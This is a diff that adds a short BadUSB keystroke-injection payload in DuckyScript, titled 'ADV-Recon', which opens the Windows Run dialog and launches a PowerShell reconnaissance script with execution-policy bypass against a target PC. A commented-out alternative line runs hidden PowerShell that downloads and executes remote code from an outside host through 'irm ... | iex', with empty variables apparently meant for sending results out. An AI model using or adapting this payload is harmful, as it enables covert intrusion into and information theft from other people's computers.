@@ -1,0 +1,10 @@
+REM     Title: ADV-Recon
+REM     Author: I am Jakoby
+REM     Description: This payload is meant to do an advanced recon of the target's PC. See README.md file for more details.
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 1000
+REM powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
+STRING powershell -NoP -Ep Bypass "F:\flipper\badusb\scripts\ADV-Recon.ps1"
+ENTER
